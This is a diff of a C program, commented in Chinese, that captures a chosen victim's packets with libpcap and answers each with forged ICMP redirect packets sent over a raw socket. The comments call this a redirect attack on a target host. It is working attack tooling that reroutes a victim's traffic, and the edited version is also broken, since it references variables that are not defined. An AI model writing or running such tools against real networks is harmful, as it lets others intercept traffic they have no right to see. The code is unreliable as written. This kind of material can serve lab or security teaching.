@@ -189,7 +189,7 @@ void icmp_redirect(int sockfd,const unsigned char * packet_data){
     printf("redirect\n");
 }
 /*解析IP数据包*/
-void parseIPHeader(const u_int8_t *ip_packet)
+void checkIP(const u_int8_t *ip_packet)
 {
 	const struct ip_header *ip;
 	ip = (struct ip_header*)ip_packet;
@@ -197,11 +197,11 @@ void parseIPHeader(const u_int8_t *ip_packet)
 
 	if(ip_header_len<20)
 	{
-		//printf("Invalid IP header len!\n");
+		printf("Invalid IP header len!\n");
 		return;
 	}
 
-    //寻找攻击对象的数据包
+    //寻找攻击对象发送的数据包
 	if(!strcmp(Vic_IP,inet_ntoa(ip->ip_source_address)))
 	{
         int sockfd,res;
@@ -235,9 +235,12 @@ void parseIPHeader(const u_int8_t *ip_packet)
 	}
 }
 /*解析数据包*/
-void getPacket(u_int8_t * arg, const struct pcap_pkthdr * pkthdr, const u_int8_t * packet) //pcap_pkthdr:在pcap.h中定义，packet:保存捕获的数据 
+void getPacket(u_int8_t * arg, const struct pcap_pkthdr * pkthdr, const u_int8_t * packet) 
 {
     static int count = 1;   //计数
+   	int sockfd,res;
+    int one = 1;
+    int *ptr_one = &one;
 
     /* 包头 */
 	const struct ethernet_header *ethernet;  /* The ethernet header [1] */
@@ -245,30 +248,31 @@ void getPacket(u_int8_t * arg, const struct pcap_pkthdr * pkthdr, const u_int8_t
 	const struct tcp_header *tcp;            /* The TCP header */
 	const char *payload;                    /* Packet payload */
 
-    int size_ip;
-	int size_tcp;
-	int size_payload;
+    int ipHeaderLen;
+	int tcpHeaderLen;
+	//int size_payload;
 
     printf("\nPacket number %d:\n", count++);
     printf("Packet length: %d\n", pkthdr->len);
 
     /* define ethernet header */
 	ethernet = (struct ethernet_header*)(packet);
-	
+
 	/* define/compute ip header offset */   
-	ip = (struct ip_header*)(packet + SIZE_ETHERNET);    //强制类型转换
-	size_ip = (ip->ip_header_length)*4;  //IP头长度的单位是4字节
-	if (size_ip < 20) {
+	ip = (struct ip_header*)(packet + SIZE_ETHERNET); 
+	ipHeaderLen = (ip->ip_header_length)*4;  //IP头长度的单位是4字节
+	if (ipHeaderLen < 20) {
 		printf("   * Invalid IP header length: %u bytes\n", size_ip);
 		return;
 	}
 
-	/* print source and destination IP addresses */
-	printf("       From: %s\n", inet_ntoa(ip->ip_source_address)); /* Convert Internet number in IN to ASCII representation.  The return value
-                                                        is a pointer to an internal array containing the string.  */
-	printf("         To: %s\n", inet_ntoa(ip->ip_destination_address));
 	
-    /* determine protocol */	
+	// print source and destination IP addresses 
+	printf("       From: %s\n", inet_ntoa(ip->ip_source_address)); 
+	printf("         To: %s\n", inet_ntoa(ip->ip_destination_address));
+
+	/*
+	// determine protocol 	
 	switch(ip->ip_protocol) {
 		case IPPROTO_TCP:
 			printf("   Protocol: TCP\n");
@@ -286,79 +290,74 @@ void getPacket(u_int8_t * arg, const struct pcap_pkthdr * pkthdr, const u_int8_t
 			printf("   Protocol: unknown\n");
 			break;
 	}
-
-    //接受到的是以太网帧
-	ethernet = (struct ethernet_header*)packet;
-	ip = (struct ip_header*)(packet + SIZE_ETHERNET);
-    //检测目标ip的数据，设置socket，重定向
-	parseIPHeader(packet + SIZE_ETHERNET);
-    
+   */
+	/*//tcpHeaderLen = (struct tcp_header*)(packet + SIZE_ETHERNET+ipHeaderLen); 
+	if(tcpHeaderLen<20)
+	{
+		printf("   * Invalid TCP header length: %u bytes\n", size_ip);
+		return;
+	}*/
+//创建raw socket，手动填充icmp部分
+	if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0)
+        {
+            printf("create sockfd error\n");
+            exit(-1);
+        }
+	 //开启IP_HDRINCL选项，手动填充IP头
+    res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one));   
+    if(res < 0)
+    {
+        printf("error--\n");
+        exit(-3);
+    }
+    //重定向攻击
+    icmp_redirect(sockfd,ip_packet);
+    close(sockfd);	
     return;
 }
 
-
-
-int main(int argc, char *argv[])
+int main()
 {
-    char *dev=NULL; //设备名称
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t *handle; //会话句柄
-    struct bpf_program fp; //编译的过滤器表达式
-    char filter_exp[] = "ip"; //过滤器监听端口
-    bpf_u_int32 mask;//自己的掩码
-    bpf_u_int32 net; //自己的ip
-    int num_packets = 20;	//要捕获的数据包个数
-    int RedirectFlag = 0;   //是否重定向攻击
+    char errBuf[PCAP_ERRBUF_SIZE], * devStr;
+    struct bpf_program filter;
+    char filterstr[50]={0};
+    
+    /* get a device */
+    devStr = pcap_lookupdev(errBuf);
 
-    //获取网卡
-    dev = pcap_lookupdev(errbuf);
-    if (dev == NULL) {
-        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
-        return(2);
+    if(devStr)
+        printf("success: device: %s\n", devStr);
+    else
+    {
+        printf("error: %s\n", errBuf);
+        exit(1);
     }
-    
 
-    //获取设备的ip和mask
-    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
-		fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
-		    dev, errbuf);
-		net = 0;
-		mask = 0;
-	}
-    printf("Device: %s\n", dev);
-    
-    //打开设备，1表示混杂模式（网卡接收经过的所有数据流，不论目的地址），BUFSIZ为最大补货数据量，1000位读取超时 ms
-    //获取一个会话
-    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-    if (handle == NULL) {
-		 fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
-		 return(2);
-	}
-
-    //过滤指定流量，htto 80，DNS 53，或直接ip,tcp
-    //编译过滤器表达式,使嗅探器在设备dev上以混杂模式嗅探来自或前往端口filter_exp的所有流量
-    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
-		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
-		 return(2);
-	 }
-     //应用过滤器
-	 if (pcap_setfilter(handle, &fp) == -1) {
-		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
-		 return(2);
-	 }
-
-     /*
-     //抓个包
-     packet = pcap_next(handle, &header);
-     printf("packet length = %d\n", header.len);
-     
+    /*捕获数据
+    * 参数：
+    * 设备名称，最大捕获量(字节)，是否置于混杂模式（混杂即捕获设备收发的所有数据），超时时间（0表示没有超时等待），错误信息
     */
-    //循环抓包
-    pcap_loop(handle, -1, getPacket, NULL);   //num_packets为抓包个数，-1为一直抓包，getBack回调函数，NULL默认，未知 
+    pcap_t * handle = pcap_open_live(devStr, 65535, 1, 0, errBuf);    
 
+    //编译filter
+    //参数：filter过滤器指针;filterstr过滤表达式; 1:表达式是否被优化;0：应用此过滤器的掩码
+    sprintf(filterstr,"src host %s",Vic_IP);        //只嗅探目标IP的数据报
+    if (pcap_compile(handle, &filter, filterstr, 1, 0) == -1) {
+		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
+		 return 0;
+	 }
+     //启用过滤器
+     if (pcap_setfilter(handle, &filter) == -1) {
+         fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+         return 0;
+     }
+
+
+    //循环抓包
+    //-1表示循环次数，getPacket是回调函数，用于解析数据包，最后参数一般置为null
+    pcap_loop(handle, -1, getPacket, NULL);
+    
     pcap_freecode(&fp);
     pcap_close(handle);
-
-    printf("\nCapture complete.\n");
-    return(0);
+    return 0;
 }
